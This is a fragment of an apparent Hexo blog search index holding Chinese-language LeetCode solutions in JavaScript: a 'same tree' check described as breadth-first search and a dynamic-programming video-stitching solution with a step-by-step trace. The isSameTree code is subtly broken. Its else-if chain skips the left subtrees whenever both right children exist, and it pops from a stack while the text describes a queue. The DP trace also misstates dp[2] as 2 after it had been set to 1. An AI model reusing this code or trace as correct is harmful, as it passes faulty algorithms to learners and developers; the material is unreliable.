<li>比较两个节点的值，如果两个节点的值不相同则两个二叉树一定不同</li>
<li>如果两个节点的值相同，则判断两个节点的子节点是否为空，如果只有一个节点的左子节点为空，或者只有一个节点的右子节点为空，则两个二叉树的结构不同，因此两个二叉树一定不同</li>
<li>如果两个节点的子节点的结构相同，则将两个节点的非空子节点分别加入两个队列，子节点加入队列时需要注意顺序，如果左右子节点都不为空，则先加入左子节点，后加入右子节点</li>
</ol>
</li>
<li>时间复杂度：O(min(m,n))，其中 m 和 n 分别是两个二叉树的节点数。对两个二叉树同时进行广度优先搜索，只有当两个二叉树中的对应节点都不为空时才会访问到该节点，因此被访问到的节点数不会超过较小的二叉树的节点数</li>
<li>空间复杂度：O(min(m,n))，其中 m 和 n 分别是两个二叉树的节点数。空间复杂度取决于队列中的元素个数，队列中的元素个数不会超过较小的二叉树的节点数</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isSameTree = <span class="function"><span class="keyword">function</span>(<span class="params">p, q</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack1= [];</span><br><span class="line">    <span class="keyword">let</span> stack2 = [];</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">p === <span class="literal">null</span> &amp;&amp; q === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">p === <span class="literal">null</span> || q === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        stack1.push(p);</span><br><span class="line">        stack2.push(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">while</span>(<span class="params">stack1.length !== <span class="number">0</span> &amp;&amp; stack2.length !== <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> node1 = stack1.pop();</span><br><span class="line">        <span class="keyword">let</span> node2 = stack2.pop();</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">node1.val === node2.val</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">node1.right &amp;&amp; node2.right</span>)</span>&#123;</span><br><span class="line">                stack1.push(node1.right);</span><br><span class="line">                stack2.push(node2.right);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">node1.left &amp;&amp; node2.left</span>)</span>&#123;</span><br><span class="line">                stack1.push(node1.left);</span><br><span class="line">                stack2.push(node2.left);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">node1.left === <span class="literal">null</span> ^ node2.left === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">node1.right === <span class="literal">null</span> ^ node2.right === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>二叉树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>视频拼接</title>
    <url>/2020/11/10/%E8%A7%86%E9%A2%91%E6%8B%BC%E6%8E%A5/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ul>
<li>你将会获得一系列视频片段，这些片段来自于一项持续时长为 T 秒的体育赛事。这些片段可能有所重叠，也可能长度不一,视频片段 clips[i] 都用区间进行表示：开始于 clips[i][0] 并于 clips[i][1] 结束。我们甚至可以对这些片段自由地再剪辑，例如片段 [0, 7] 可以剪切成 [0, 1] + [1, 3] + [3, 7] 三部分,我们需要将这些片段进行再剪辑，并将剪辑后的内容拼接成覆盖整个运动过程的片段（[0, T]）。返回所需片段的最小数目，如果无法完成该任务，则返回 -1</li>
</ul>
<h3 id="动态规划–示例数据"><a href="#动态规划–示例数据" class="headerlink" title="动态规划–示例数据"></a>动态规划–示例数据</h3><p>clips = [[0,2],[4,6],[8,10],[1,9],[1,5],[5,9]], T = 10</p>
<ol>
<li>排序 clips = [[0,2],[1,5],[1,9],[4,6],[5,9],[8,10]]</li>
<li>设置dp dp=[0,101,101,101,101,101,101,101,101,101,101] (T+1)</li>
<li>遍历clips<ol>
<li>start = 0, end = 2 遍历j(start+1,end)<ol>
<li>dp[1] = min(dp[1], dp[0] + 1) = min(101, 1) = 1</li>
<li>dp[2] = min(dp[2], dp[0] + 1) = 1</li>
</ol>
</li>
<li>start = 1, end = 5<ol>
<li>dp[2] = min(dp[2], dp[1] + 1) = min(101, 2) = 2</li>
<li>dp[3] = min(dp[3], dp[1] + 1) = 2</li>
<li>dp[4] = min(dp[4], dp[1] + 1) = 2</li>
<li>dp[5] = min(dp[5], dp[1] + 1) = 2</li>
</ol>
</li>
<li>start = 1, end = 9<ol>
<li>dp[2] = min(dp[2], dp[1] + 1) = min(2, 2) = 2</li>
<li>dp[3-5] = 2</li>
<li>dp[6] = min(dp[6], dp[1] + 1) = min(101, 2) = 2</li>
<li>dp[7-9] = 2</li>
</ol>
</li>
<li>start = 4, end = 6<ol>
<li>dp[5] = min(dp[5], dp[4] + 1) = min(2, 3) = 2</li>
<li>dp[6] = min(dp[6], dp[4] + 1) = min(2, 3) = 2</li>
</ol>
</li>
<li>start = 5, end = 9<ol>
<li>dp[6] = min(dp[6], dp[5] + 1) = min(2, 3) = 2</li>
<li>dp[7-9] = min(2, 3) = 2</li>
</ol>
</li>
<li>start = 8, end = 10<ol>
<li>dp[9] = min(dp[9], dp[8] + 1) = min(2, 3) = 2</li>
<li>dp[10] = min(dp[10], dp[8] + 1) = min(101, 3) = 3</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="方法1-–-动态规划"><a href="#方法1-–-动态规划" class="headerlink" title="方法1 – 动态规划"></a>方法1 – 动态规划</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> videoStitching = <span class="function"><span class="keyword">function</span>(<span class="params">clips, T</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//先将数组排序</span></span><br><span class="line">    clips.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>]===b[<span class="number">0</span>])<span class="keyword">return</span> a[<span class="number">1</span>]-b[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>]-b[<span class="number">0</span>];</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">//创建新数组并赋值为最大</span></span><br><span class="line">    <span class="keyword">let</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(T + <span class="number">1</span>).fill(<span class="number">101</span>);</span><br><span class="line">    <span class="comment">//数组第一个值设置为0</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; clips.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//赋值开始与结束值</span></span><br><span class="line">        <span class="keyword">let</span> [start, end] = clips[i];</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j = start + <span class="number">1</span>; j &lt;=end; j++</span>)</span>&#123;</span><br><span class="line">            <span class="comment">//判断本片段开始时已走步数加1是否大于现在的步数</span></span><br><span class="line">            dp[j] = <span class="built_in">Math</span>.min(dp[j], dp[start] + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">dp[T] === <span class="number">101</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[T]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>数组算法</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
      </tags>
  </entry>
</search>
